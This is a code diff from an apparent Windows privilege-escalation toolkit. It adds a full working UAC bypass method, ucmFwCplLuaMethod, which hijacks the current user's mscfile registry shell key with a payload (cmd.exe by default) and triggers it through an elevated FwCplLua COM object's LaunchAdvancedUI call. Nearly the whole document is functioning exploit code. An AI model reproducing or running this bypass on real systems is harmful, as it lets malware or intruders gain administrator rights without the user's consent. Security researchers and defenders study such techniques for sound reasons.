@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.80
+*  VERSION:     2.82
 *
-*  DATE:        07 Sept 2017
+*  DATE:        02 Nov 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2060,4 +2060,125 @@ BOOL ucmMethodCorProfiler(
         supSetEnvVariable(TRUE, COR_PROFILER_PATH, NULL);
 
     return bResult;
+}
+
+/*
+* ucmFwCplLuaMethod
+*
+* Purpose:
+*
+* Bypass UAC using FwCplLua undocumented COM interface and mscfile registry hijack.
+* This function expects that supMasqueradeProcess was called on process initialization.
+*
+*/
+BOOL ucmFwCplLuaMethod(
+    _In_opt_ LPWSTR lpszPayload
+)
+{
+    HRESULT          r = E_FAIL;
+    BOOL             bCond = FALSE;
+    
+    LPWSTR           lpBuffer = NULL;
+    LRESULT          lResult;
+    HKEY             hKey = NULL;
+    SIZE_T           sz = 0;
+
+    IID              xIIDFwCplLua;
+    IFwCplLua       *FwCplLua = NULL;
+
+    WCHAR            szBuffer[MAX_PATH + 1];
+
+    do {
+
+        //
+        // Query IID for FwCplLua.
+        //
+        if (IIDFromString(T_IID_IFwCplLua, &xIIDFwCplLua) != S_OK) {
+            break;
+        }
+
+        //
+        // Select payload.
+        //
+        if (lpszPayload != NULL) {
+            lpBuffer = lpszPayload;
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            lpBuffer = szBuffer;
+        }
+
+        sz = _strlen(lpBuffer);
+        if (sz == 0)
+            break;
+
+        //
+        // Create controlled mscfile entry.
+        //
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
+            T_MSC_SHELL,
+            0, 
+            NULL,
+            REG_OPTION_NON_VOLATILE, 
+            MAXIMUM_ALLOWED, 
+            NULL, 
+            &hKey, 
+            NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set "Default" value as our payload.
+        //
+        sz = (1 + sz) * sizeof(WCHAR);
+        lResult = RegSetValueEx(
+            hKey,
+            TEXT(""),
+            0,
+            REG_SZ,
+            (BYTE*)lpBuffer,
+            (DWORD)sz);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        RegCloseKey(hKey);
+        hKey = NULL;
+
+        //
+        // Get elevated COM object for FwCplLua interface.
+        //
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_FwCplLua,
+            CLSCTX_LOCAL_SERVER,
+            &xIIDFwCplLua,
+            &FwCplLua);
+
+        if (r != S_OK)
+            break;
+
+        if (FwCplLua == NULL) {
+            r = E_FAIL;
+            break;
+        }
+
+        //
+        // Execute method from FwCplLua interface.
+        // This will trigger our payload as shell will attempt to run it.
+        //
+        r = FwCplLua->lpVtbl->LaunchAdvancedUI(FwCplLua);
+
+    } while (bCond);
+
+    if (hKey != NULL)
+        RegCloseKey(hKey);
+
+    if (FwCplLua != NULL) {
+        FwCplLua->lpVtbl->Release(FwCplLua);
+    }
+
+    return SUCCEEDED(r);
 }
